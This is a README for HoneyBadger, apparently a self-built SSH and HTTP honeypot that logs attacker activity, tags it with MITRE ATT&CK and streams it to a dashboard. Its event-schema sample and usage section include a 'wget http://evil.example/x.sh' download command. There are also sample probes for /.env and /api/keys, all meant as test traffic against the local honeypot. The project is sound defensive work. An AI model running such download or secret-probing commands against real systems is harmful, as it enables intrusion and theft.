# 🍯 HoneyBadger

A self-contained network honeypot suite: a **custom-built SSH and HTTP honeypot** in Python that captures attacker activity, auto-classifies it against **MITRE ATT&CK**, and streams the results to a **React dashboard** with a full observability stack — all deployed with **docker-compose**.

> Built from scratch. No Cowrie, no K8s, no external brokers. One asyncio process, one event pipeline, one `docker-compose up`.

---

## Table of contents

- [🍯 HoneyBadger](#-honeybadger)
  - [Table of contents](#table-of-contents)
  - [What is HoneyBadger?](#what-is-honeybadger)
  - [Highlights / features](#highlights--features)
  - [Architecture](#architecture)
    - [Backend (`backend/`) — Python honeypot core](#backend-backend--python-honeypot-core)
    - [Dashboard (`dashboard/`) — React + Vite SPA](#dashboard-dashboard--react--vite-spa)
    - [Monitoring (`monitoring/`) — Observability](#monitoring-monitoring--observability)
    - [PostgreSQL](#postgresql)
  - [Event pipeline](#event-pipeline)
  - [MITRE ATT\&CK classification](#mitre-attck-classification)
  - [Event model (intake contract)](#event-model-intake-contract)
  - [Project structure](#project-structure)
  - [Prerequisites](#prerequisites)
  - [Quick start](#quick-start)
  - [Configuration](#configuration)
  - [Using the honeypot](#using-the-honeypot)
  - [Services \& ports](#services--ports)
  - [APIs](#apis)
  - [Observability](#observability)
  - [Safety model](#safety-model)
  - [Testing](#testing)
  - [Development without Docker](#development-without-docker)
  - [Troubleshooting](#troubleshooting)
  - [Related docs](#related-docs)
  - [License](#license)

---

## What is HoneyBadger?

HoneyBadger deploys a **fake SSH server** (port `8022`) and a **fake HTTP surface** (port `8081`) that look and behave like real — and often misconfigured — infrastructure. Anything an attacker throws at them is:

1. **Captured** at the edge (credentials, commands, HTTP probes, payload references),
2. **Enriched** in a two-stage async event pipeline (GeoIP lookup, MITRE ATT&CK technique tagging, credential aggregation),
3. **Stored** in PostgreSQL (hashes and aggregates only — no plaintext),
4. **Streamed** to a live React dashboard and exported to Prometheus for Grafana-backed alerting.

The entire system is designed around four goals, in priority order:

1. **Containment** — nothing an attacker does ever leaves the sandbox.
2. **Originality** — SSH emulation, event bus, enrichment pipeline, and dashboard are all built in-house (no Cowrie).
3. **Demoability** — one `docker-compose up` spins up the whole stack, seeded by a bundled attack simulator.
4. **Security literacy** — every event is auto-classified against MITRE ATT&CK, so demos double as teaching material.

## Highlights / features

- **Custom SSH emulation** (`asyncssh`) with an interactive fake shell that intercepts `wget`/`curl` — attackers get believable responses, we get the **payload metadata only**. Accepts any credentials, drops the peer into a realistic shell (`ls`, `cd`, `cat`, `whoami`, `id`, `uname`, `echo`, `history`, …).
- **HTTP bait surface** (`aiohttp`) — fake login pages and common probe targets (`wp-login.php`, `/admin`, `.env`, API-key endpoints…) that respond convincingly to scanners.
- **Two-stage async event bus**: raw events → enrichment pipeline (GeoIP, MITRE, credential extraction) → enriched events → dashboard. No external message broker.
- **ATT&CK-native**: every event auto-tagged (T1110 brute force, T1110.004 credential stuffing, T1595 scanning, T1190 exploits, T1105 tool transfer, T1059 shell commands, T1078 valid accounts); the attack simulator *asserts* those tags in tests.
- **Safety by design**: passwords stored as **SHA-256 hashes only**, payloads never fetched or executed, honeypot network isolated with no egress, no backdoor to the host.
- **Real-time dashboard** (React + Vite + TypeScript): live WebSocket event feed + REST aggregates + geographic map + top-credentials panel.
- **Full observability**: Prometheus metrics, curated alert rules, provisioned Grafana dashboards, Alertmanager routing.
- **One-command stack**: PostgreSQL, backend, dashboard, Prometheus, Alertmanager, Grafana — so `docker-compose up` gets you a live, demoable system.

## Architecture

```
Attacker ──► sshd.py ──► fakeshell.py ─┐
Attacker ──► httpd.py ──► http_routes.py ─┤  raw bus ─► pipeline.py ─► Postgres
                                          │                ├─ geoip.py
                                          │                ├─ mitre.py
                                          │                └─ credentials.py
                                          └── enriched bus ─► api.py ──► dashboard
                                                                └── metrics.py ─► Prometheus ─► Grafana
```

### Backend (`backend/`) — Python honeypot core

One container, one asyncio event loop, zero external brokers.

| Module | Responsibility |
|---|---|
| `main.py` | Entrypoint: wires the buses, starts listeners + pipeline, creates the DB pool |
| `bus.py` | In-process asyncio pub/sub. Two instances: **raw bus** (sensor → pipeline) and **enriched bus** (pipeline → API) |
| `sshd.py` | `asyncssh` honeypot: accepts any credentials, drops the peer into the fake shell |
| `fakeshell.py` | Emulated shell with `wget`/`curl` interception → payload metadata |
| `httpd.py` | `aiohttp` HTTP honeypot — the internet-facing edge, with its own rate limits |
| `http_routes.py` | Bait responses (fake login pages, common probe endpoints) |
| `pipeline.py` | Enrichment pipeline: transforms raw events into enriched facts |
| `geoip.py` | `GeoIpProvider` interface — default `ip-api.com` (no key, cached), MaxMind/GeoLite2 opt-in |
| `mitre.py` | Rule-based ATT&CK technique classifier |
| `credentials.py` | Credential extraction (SHA-256 hashes only) + top-N counters for the dashboard |
| `payloads.py` | Payload metadata capture — never fetch/execute |
| `api.py` | REST endpoints (stats/aggregates) + WebSocket live-event broadcast |
| `storage.py` | Async SQLAlchemy → PostgreSQL, repository per entity |
| `metrics.py` | Prometheus exporter on `:8000` |
| `alerts.py` | Threshold checks (brute-force rate, payload capture, retention lag, health) → Alertmanager |
| `retention.py` | Scheduled purge of events older than 6 months |

### Dashboard (`dashboard/`) — React + Vite SPA

- **Live feed** over WebSocket (new events as they land).
- **Statistics** via REST polling (counts, top credentials, top source IPs, technique breakdown).
- **Views**: live event table, charts (attacks over time, technique mix), geographic map, top-credentials panel.
- Multi-stage Docker build → static host served at `:3000`.

### Monitoring (`monitoring/`) — Observability

- **Prometheus** scrapes `backend:8000`; ships alert rules + recording rules.
- **Alertmanager** routes alerts (webhook/email optional).
- **Grafana** with provisioned dashboards: main overview, SSH attacks, HTTP attacks, geographic heatmap, attack patterns.

### PostgreSQL

- `events` — one row per captured interaction (`inet` source IP, service, username, `pass_hash`, UA, HTTP fields, command, payload refs, `technique_id`, severity).
- `credential_counts` — aggregate counters (top-N), **no plaintext**.
- `payloads` — URL, hash, size, quarantine status.
- GeoIP cache table.
- Indexes on `(source_ip, ts)` and `(service, ts)`.

## Event pipeline

```
sshd.py / httpd.py
      |  publish
      v
 raw bus ──▶ pipeline.py ──▶ geoip.py ──▶ mitre.py ──▶ credentials.py
               |                                     |
               |           enriched bus ◀────────────┘
               |                     |
               v                     v
         storage.py             api.py (REST + WS) ──▶ dashboard/
         (PostgreSQL)           metrics.py ──▶ Prometheus ──▶ Grafana + Alertmanager
```

## MITRE ATT&CK classification

| Event pattern | Technique |
|---|---|
| Password guessing (SSH/HTTP login attempts) | `T1110` — Brute Force |
| Repeated same-credential attempts | `T1110.004` — Credential Stuffing |
| Scanner / probe hits | `T1595` — Active Scanning |
| Exploit-shaped payloads | `T1190` — Exploit Public-Facing Application |
| Payload download attempt (`wget`/`curl`) | `T1105` — Ingress Tool Transfer |
| Shell commands issued | `T1059` — Command and Scripting Interpreter |
| "Successful" session context | `T1078` — Valid Accounts (contextual) |

The attack simulator in `sim/simulate.py` asserts that generated attacks produce the correct technique tags — the classifier is verified by tests, not by hand.

## Event model (intake contract)

Events flow through the intake API (`POST /v1/events`) and are persisted in this shape:

```jsonc
{
  "service": "ssh | http",
  "source_ip": "203.0.113.7",
  "ts": "2026-09-24T10:15:30Z",
  "username": "root",
  "password_hash": "sha256:<hex>",   // computed at the edge
  "user_agent": "curl/8.0",
  "http_method": "POST", "http_path": "/wp-login.php", "http_status": 200,
  "command": "wget http://evil.example/x.sh",
  "payload_url": "http://evil.example/x.sh",
  "payload_sha256": "...", "payload_size": 1234
}
```

## Project structure

```
HoneyBadger/
│
├── README.md                              # This overview
├── docker-compose.yml                     # Entire stack locally: docker-compose up
├── .env.example                           # Environment variable template
├── .gitignore
│
├── backend/                               # Python honeypot core (one image, one asyncio loop)
│   ├── requirements.txt
│   ├── Dockerfile
│   ├── main.py                            # Entrypoint: wiring, config load, lifecycle
│   ├── config.py                          # pydantic-settings, per-env config
│   ├── schemas.py                         # Pydantic event models + intake contract
│   ├── bus.py                             # Raw + enriched in-process asyncio event buses
│   ├── sshd.py                            # asyncssh honeypot
│   ├── fakeshell.py                       # Fake shell + wget/curl interception
│   ├── httpd.py                           # aiohttp HTTP honeypot
│   ├── http_routes.py                     # Bait responses (fake login, probe responses)
│   ├── pipeline.py                        # Enrichment: geoip -> mitre -> credentials
│   ├── geoip.py                           # GeoIpProvider (ip-api default, cached, MaxMind opt-in)
│   ├── mitre.py                           # Rule-based ATT&CK classifier
│   ├── credentials.py                     # Hash-only extraction + top-N counters
│   ├── payloads.py                        # Payload metadata capture (never fetch/execute)
│   ├── api.py                             # REST (stats) + WebSocket (live events)
│   ├── storage.py                         # Async SQLAlchemy -> PostgreSQL
│   ├── metrics.py                         # Prometheus exporter (:8000)
│   ├── alerts.py                          # Threshold checks -> Alertmanager
│   ├── retention.py                       # Scheduled purge (> 6 months)
│   ├── db/
│   │   ├── models.py                      # SQLAlchemy models
│   │   └── migrations/
│   ├── sim/
│   │   └── simulate.py                    # Attack simulator / demo + integration driver
│   └── tests/
│       ├── test_fakeshell.py
│       ├── test_mitre.py
│       ├── test_pipeline.py
│       └── test_ssh_handshake.py
│
├── dashboard/                             # React + Vite SPA (TypeScript)
│   ├── package.json
│   ├── vite.config.ts
│   ├── Dockerfile                         # Multi-stage build -> static host
│   └── src/
│       ├── app.tsx                        # Main dashboard
│       ├── api/                           # REST polling client
│       ├── ws/                            # WebSocket live-event client
│       ├── components/                    # Charts, table, geo map, cards
│       └── hooks/                         # useLiveEvents, useStats, etc.
│
├── monitoring/
│   ├── prometheus/
│   │   ├── prometheus.yml                 # Scrape configs
│   │   ├── rules/
│   │   │   ├── alerts.yml                 # Rate, payload, health alerts
│   │   │   └── recording-rules.yml
│   │   └── Dockerfile
│   ├── grafana/
│   │   ├── provisioning/
│   │   │   ├── datasources/               # Prometheus datasource
│   │   │   └── dashboards/                # Provisioned dashboards
│   │   └── Dockerfile
│   └── alertmanager/
│       ├── alertmanager.yml
│       └── Dockerfile
│
├── docs/
│   ├── ARCHITECTURE.md                    # System design + diagrams
│   ├── ANALYSIS.md                        # Sample findings + interpretation template
│   ├── RESPONSIBLE_DISCLOSURE.md          # Ethics + responsible handling
│   └── API.md                             # REST + WebSocket API documentation
│
├── tests/
│   ├── integration/
│   │   ├── test_end_to_end.sh             # Full flow
│   │   └── test_api_contract.py           # Intake API compatibility
│   ├── security/
│   │   ├── test_network_isolation.sh      # Verify containment
│   │   └── test_credentials.sh            # Verify hash-only policy
│   └── fixtures/                          # Sample events, mock geoip data
```

## Prerequisites

- **Docker** with **Docker Compose v2** (`docker compose version` works / `docker-compose` available). On Windows that means Docker Desktop; on Linux/macOS the engine + compose plugin.
- **A few open host ports** (see [Services & ports](#services--ports)): `8022`, `8081`, `8000`, `8090`, `3000`, `9090`, `9093`.
- **No inbound internet access is required to build.** The honeypot network is deliberately egress-free; GeoIP lookups (default `ip-api.com`) go out only if you enable the provider — it is cached and non-blocking.
- For local dev without Docker: Python 3.11+, Node.js 18+, PostgreSQL 14+.

## Quick start

```bash
git clone https://github.com/yourusername/honeybadger.git
cd honeybadger

# 1. Configure (optional — defaults are fine for a first run)
cp .env.example .env

# 2. Bring up the whole stack
docker-compose up -d

# 3. Follow the logs
docker-compose logs -f
```

If this is your first run, Docker will build the backend, dashboard, Prometheus, Grafana and Alertmanager images, and start PostgreSQL. The pipeline and storage start only after PostgreSQL is reachable (healthchecks on every service).

Then point your browser at `http://localhost:3000` → send traffic at ports **8022** (SSH) and **8081** (HTTP) — or run the bundled attack simulator to seed it:

```bash
docker-compose exec backend python -m sim.simulate
```

You should immediately see synthetic attacker events appear in the dashboard's live feed, tagged with their MITRE technique, and land on the maps and charts.

## Configuration

Copy `.env.example` to `.env` and adjust. Notable settings:

| Variable | Default | Purpose |
|---|---|---|
| `CAPTURE_PAYLOADS` | `false` | Opt-in. When `true`, payload metadata is also staged into a **noexec quarantine** dir for manual static review |
| GeoIP provider | `ip-api` | `ip-api.com` needs no key and is cached; MaxMind/GeoLite2 is the opt-in alternative |
| Retention window | `6 months` | Events older than this are purged by `retention.py` |
| Alert destinations | — | Webhook/email routing for Alertmanager (optional) |

Only hashes and aggregates are ever persisted — see [Safety model](#safety-model).

## Using the honeypot

Throw some real-shaped traffic at it:

```bash
# Fake SSH login attempts (any creds accepted, shells are fake)
ssh -p 8022 root@localhost
ssh -p 8022 root@localhost 'wget http://evil.example/x.sh'

# Fake HTTP probing
curl -X POST http://localhost:8081/wp-login.php -d 'log=admin&pwd=password123'
curl http://localhost:8081/.env
curl http://localhost:8081/api/keys
```

Everything lands in the pipeline, gets a GeoIP + MITRE tag, and shows up in real time on the dashboard.

Then explore:

- **Dashboard** `http://localhost:3000` — live event feed, stats, geographic map, top credentials, technique mix.
- **Prometheus** `http://localhost:9090` — raw metrics (brute-force rate, payload captures, service health).
- **Grafana** `http://localhost:3000/grafana` — provisioned dashboards (main, SSH attacks, HTTP attacks, heatmap, attack patterns).
- **Alertmanager** `http://localhost:9093` — fired alerts (e.g. brute-force waves, payload captures, retention lag).

## Services & ports

| Service | Container | Host |
|---|---|---|
| SSH honeypot (`sshd.py`) | 22 | 8022 |
| HTTP honeypot (`httpd.py`) | 8081 | 8081 |
| Metrics (`metrics.py`) | 8000 | 8000 |
| Intake API (`api.py`) | 8090 | 8090 |
| Dashboard (React SPA) | 80 (or 5173 dev) | 3000 |
| PostgreSQL | 5432 | 5432 |
| Prometheus | 9090 | 9090 |
| Alertmanager | 9093 | 9093 |
| Grafana | 3000 | 3000 |

Quick reference:

| URL | What's there |
|---|---|
| `http://localhost:3000` | Dashboard |
| `http://localhost:8090` | Intake / stats API |
| `http://localhost:9090` | Prometheus |
| `http://localhost:3000/grafana` | Grafana |
| `http://localhost:9093` | Alertmanager |

## APIs

The backend exposes two surfaces (both documented in `docs/API.md`):

- **REST** on `:8090` — `POST /v1/events` (intake contract, see [Event model](#event-model-intake-contract)) plus stats/aggregates endpoints for the dashboard (counts, top credentials, top source IPs, technique breakdown).
- **WebSocket** on `:8090` — live broadcast of enriched events; the dashboard's feed subscribes here.

## Observability

| Tool | Role |
|---|---|
| Prometheus | Scrapes `backend:8000`; runs recording + alert rules |
| Alertmanager | Routes alerts (webhook/email optional) |
| Grafana | Provisioned dashboards: main, SSH attacks, HTTP attacks, geographic heatmap, attack patterns |

**Alert philosophy** — alerts are *meaningful*: brute-force **rate** waves, payload captures, retention lag, and service health. There is deliberately **no "login success" alert** — the honeypot always accepts credentials, so such an alert would fire on every single event and be noise.

## Safety model

This project is designed to be harmless, on purpose:

- **No plaintext credentials** — passwords are SHA-256-hashed at the edge; only hashes and aggregates are persisted (verified by `tests/security/test_credentials.sh`).
- **No malware execution** — payloads are recorded as URL + hash + size only; optional (off-by-default) `CAPTURE_PAYLOADS` stages files into a **noexec quarantine** for manual static review. Nothing is ever fetched to or executed on the host or its network.
- **No internet egress** from the honeypot network (verified by `tests/security/test_network_isolation.sh`).
- **Containment**: captured artifacts never reach the host filesystem or network.
- Read the ethics + handling notes in **[docs/RESPONSIBLE_DISCLOSURE.md](docs/RESPONSIBLE_DISCLOSURE.md)**.

## Testing

| Layer | What runs | Where |
|---|---|---|
| Unit | fakeshell parsing, MITRE classifier, pipeline enrichment, GeoIP caching, credential hashing | `backend/tests/` |
| Integration | full end-to-end flow, intake API contract | `tests/integration/` |
| Security | network isolation, hash-only credential policy | `tests/security/` |
| Simulator | generates realistic traffic; *asserts* ATT&CK tags | `sim/simulate.py` |

```bash
# Inside the backend container
docker-compose exec backend pytest

# Integration / security scripts
tests/integration/test_end_to_end.sh
tests/integration/test_api_contract.py
tests/security/test_network_isolation.sh
tests/security/test_credentials.sh
```

## Development without Docker

Backend (Python 3.11+):

```bash
cd backend
python -m venv .venv && .venv/Scripts/activate   # Windows
# or: source .venv/bin/activate                  # Linux / macOS
pip install -r requirements.txt
```

Dashboard (Node.js 18+):

```bash
cd dashboard
npm install
npm run dev          # Vite dev server on :5173, HMR enabled
```

You still need a PostgreSQL instance (and a `.env` pointing at it) for the backend to persist events.

## Troubleshooting

- **Events never appear in the dashboard** — check the hero service is reaching PostgreSQL: `docker-compose logs backend`. The pipeline and storage intentionally wait for the DB to be ready.
- **GeoIP shows no country** — the default `ip-api.com` provider is cached and non-blocking; private/reserved IPs (RFC1918, localhost) have no geo data. Swarm traffic from public IPs resolves once detected.
- **Port already in use** — adjust the host-side mappings in `docker-compose.yml` and restart (`docker-compose up -d`).
- **Want a clean slate** — `docker-compose down -v` removes volumes (DB included).


## Related docs

- **[SYSTEM_ARCHITECTURE.md](SYSTEM_ARCHITECTURE.md)** — design rationale, component table, deployment & testing strategy.
- **[REPO_STRUCTURE.md](REPO_STRUCTURE.md)** — full file layout, port reference, event flow.
- **docs/** — `ARCHITECTURE.md` (design + diagrams), `ANALYSIS.md` (sample findings), `RESPONSIBLE_DISCLOSURE.md` (ethics), `API.md` (REST + WS).

## License

MIT